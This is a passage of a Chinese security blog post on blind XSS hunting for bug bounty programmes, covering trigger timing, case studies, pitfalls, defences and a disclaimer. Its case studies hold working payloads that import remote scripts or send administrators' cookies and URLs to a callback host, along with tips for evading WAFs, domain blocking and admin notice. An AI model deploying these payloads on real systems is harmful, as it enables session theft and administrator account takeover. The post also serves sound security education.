+<h2 id="五、等待的艺术：延迟触发与耐心追踪"><a href="#五、等待的艺术：延迟触发与耐心追踪" class="headerlink" title="五、等待的艺术：延迟触发与耐心追踪"></a>五、等待的艺术：延迟触发与耐心追踪</h2><p>盲XSS最反直觉的一点是<strong>时间跨度</strong>。根据实战经验，触发时间分布大致如下：</p>
+<ul>
+<li><strong>1小时内触发</strong>：约15%（实时监控系统、在线客服）</li>
+<li><strong>1-24小时触发</strong>：约35%（日常审核）</li>
+<li><strong>1-7天触发</strong>：约35%（周期性审核、工单流转）</li>
+<li><strong>7天以上触发</strong>：约10%（低频后台、月度报表）</li>
+<li><strong>从未触发</strong>：约5%</li>
+</ul>
+<p><strong>实战策略：</strong></p>
+<ol>
+<li>每天早晚各检查一次回调面板，不要频繁刷新。</li>
+<li>详细记录每次注入的位置、Payload、时间、唯一标识（例如参数 <code>?target=xxx&amp;vector=register&amp;id=20250415_001</code>）。</li>
+<li>同一注入点避免重复注入，防止引起管理员警觉。</li>
+<li>XSS Hunter面板的页面截图功能用于确认触发页面是否为管理后台，DOM快照用于分析后台结构。</li>
+</ol>
+<hr>
+<h2 id="六、SRC盲XSS实战案例"><a href="#六、SRC盲XSS实战案例" class="headerlink" title="六、SRC盲XSS实战案例"></a>六、SRC盲XSS实战案例</h2><h3 id="案例一：社交平台私信盲XSS"><a href="#案例一：社交平台私信盲XSS" class="headerlink" title="案例一：社交平台私信盲XSS"></a>案例一：社交平台私信盲XSS</h3><p>在私信的富文本编辑器中嵌入 <code>&lt;svg onload=import(&#39;//xss.mydomain.com/j.js&#39;)&gt;</code>，编辑器仅过滤 <code>&lt;script&gt;</code> 和 <code>onerror</code>&#x2F;<code>onclick</code>，遗漏了 <code>&lt;svg&gt;</code> 的 <code>onload</code>。等待4天后管理员审核举报时触发，回调显示管理员浏览器可访问内部管理API。高危，奖金2500元。</p>
+<h3 id="案例二：电商平台订单备注盲XSS"><a href="#案例二：电商平台订单备注盲XSS" class="headerlink" title="案例二：电商平台订单备注盲XSS"></a>案例二：电商平台订单备注盲XSS</h3><p>下单时在订单备注填入 <code>&quot;&gt;&lt;img src=x onerror=&quot;fetch(&#39;//xss.mydomain.com/c?c=&#39;+document.cookie+&#39;&amp;u=&#39;+document.URL)&quot;&gt;</code>。第2天和第7天分别收到卖家订单管理页和平台客服工单系统的回调，客服回调泄露了会话Token。两个系统均受影响，评级严重，奖金6000元。</p>
+<h3 id="案例三：云服务商企业认证盲XSS"><a href="#案例三：云服务商企业认证盲XSS" class="headerlink" title="案例三：云服务商企业认证盲XSS"></a>案例三：云服务商企业认证盲XSS</h3><p>注册企业账号时在公司名称字段填入 <code>&lt;svg/onload=import(&#39;//c.dd&#39;)&gt;</code>（31字符，配合短域名）。13天后多个IP触发Payload，其中一个触发源页面HTML包含 <code>role=&quot;admin&quot;</code> 和内部API密钥。事后发现审核人员浏览器加载了SSO统一认证页面，Cookie泄露可横向越权至多个子域。严重漏洞。</p>
+<p><strong>共同教训：</strong> 企业认证字段常被忽视；审核后台往往有SSO，一次XSS能影响多个子域；非标准HTML标签（如 <code>&lt;svg&gt;</code>、<code>&lt;math&gt;</code>）和事件处理器（如 <code>onload</code>、<code>onfocus</code>）比 <code>&lt;script&gt;</code> 更容易绕过过滤器。</p>
+<hr>
+<h2 id="七、盲XSS流程与常见陷阱"><a href="#七、盲XSS流程与常见陷阱" class="headerlink" title="七、盲XSS流程与常见陷阱"></a>七、盲XSS流程与常见陷阱</h2><h3 id="7-1-工作流程"><a href="#7-1-工作流程" class="headerlink" title="7.1 工作流程"></a>7.1 工作流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">识别数据持久化入口 -&gt; 测试输入过滤规则 -&gt; 注入Payload -&gt; 记录注入详情 -&gt; 等待回调</span><br><span class="line">                                                                              |</span><br><span class="line">                                                    收到回调 -&gt; 分析数据 -&gt; 编写报告 -&gt; 提交SRC</span><br><span class="line">                                                    超时(&gt;30天) -&gt; 检查拦截 -&gt; 换注入点重试</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-常见陷阱"><a href="#7-2-常见陷阱" class="headerlink" title="7.2 常见陷阱"></a>7.2 常见陷阱</h3><table>
+<thead>
+<tr>
+<th>陷阱</th>
+<th>问题</th>
+<th>对策</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WAF&#x2F;CDN过滤</td>
+<td>CDN缓存导致管理员不触发；WAF拦截外带请求</td>
+<td>注入后验证Payload完整性；多准备几个备用回调域名</td>
+</tr>
+<tr>
+<td>字符编码</td>
+<td>后台做HTML实体编码但用innerHTML渲染</td>
+<td>测试 <code>&lt;</code> 和 <code>&quot;</code> 是否被转义，寻找未编码的渲染上下文</td>
+</tr>
+<tr>
+<td>回调域名屏蔽</td>
+<td>企业DNS或安全软件屏蔽未知域名</td>
+<td>使用小众TLD（<code>.site</code>、<code>.space</code>），准备多个备用域名</td>
+</tr>
+<tr>
+<td>SameSite Cookie</td>
+<td>Cookie设为Lax&#x2F;Strict导致CSRF失败</td>
+<td>优先收集Authorization Header和localStorage中的JWT</td>
+</tr>
+<tr>
+<td>沙箱隔离</td>
+<td>管理后台用iframe隔离用户内容</td>
+<td>检测 <code>window.top !== window.self</code>，若隔离则仅做信息收集</td>
+</tr>
+</tbody></table>
+<p><strong>未收到回调时的排查清单：</strong></p>
+<ol>
+<li>Payload域名是否能正常解析？HTTPS证书有效吗？</li>
+<li>混内容拦截：HTTP Payload在HTTPS页面会被浏览器阻止。</li>
+<li>XSS Hunter服务&#x2F;Docker容器是否正常运行？</li>
+<li>Payload是否被后端 <code>strip_tags()</code> 之类的函数二次过滤？</li>
+<li>目标管理员浏览器是否有NoScript等扩展？</li>
+</ol>
+<hr>
+<h2 id="八、防御建议"><a href="#八、防御建议" class="headerlink" title="八、防御建议"></a>八、防御建议</h2><ol>
+<li><strong>输出编码</strong>：所有用户可控数据输出到HTML时进行上下文相关编码（HTML实体&#x2F;JS&#x2F;URL编码）。</li>
+<li><strong>CSP</strong>：配置严格 <code>Content-Security-Policy</code>，禁用 <code>unsafe-inline</code> 和 <code>unsafe-eval</code>。</li>
+<li><strong>输入过滤</strong>：服务端白名单校验，拒绝或净化HTML标签。</li>
+<li><strong>沙箱隔离</strong>：用户生成内容渲染在独立Origin下，使用 <code>sandbox</code> iframe。</li>
+<li><strong>Trusted Types</strong>：启用浏览器级别XSS防护。</li>
+<li><strong>定期审计</strong>：对后台管理系统进行渗透测试和代码审计。</li>
+</ol>
+<hr>
+<h2 id="九、免责声明"><a href="#九、免责声明" class="headerlink" title="九、免责声明"></a>九、免责声明</h2><blockquote>
+<p><strong>声明：</strong> 本文所述技术仅供安全研究和授权范围内的渗透测试使用。未经系统所有者明确书面授权而对任何系统进行XSS测试均属违法行为。作者不对任何滥用本文内容导致的后果承担责任。在SRC平台测试时，请严格遵守平台规则，仅在授权范围内测试，不得越权访问或篡改数据，发现漏洞后应立即通过官方渠道报告，不得公开披露。</p>
+</blockquote>
+<p>盲XSS测试注意事项：不使用破坏性Payload；回调获取的认证信息应在测试后立即失效并通知厂商；对截图等敏感信息做好脱敏。</p>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/blind">PortSwigger - Blind XSS</a></li>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Blind_XSS">OWASP - Blind XSS</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/mandatoryprogrammer/xsshunter">XSS Hunter 开源项目</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/payloadbox/xss-payload-list">XSS Payloads 参考</a></li>
+<li><a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">Google CSP Evaluator</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Intranet-Kerberos-tickets/" rel="prev" title="Kerberos攻击：票据伪造">
+                  <i class="fa fa-angle-left"></i> Kerberos攻击：票据伪造
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/XSS-mutated-xss/" rel="next" title="mXSS突变型跨站脚本">
+                  mXSS突变型跨站脚本 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
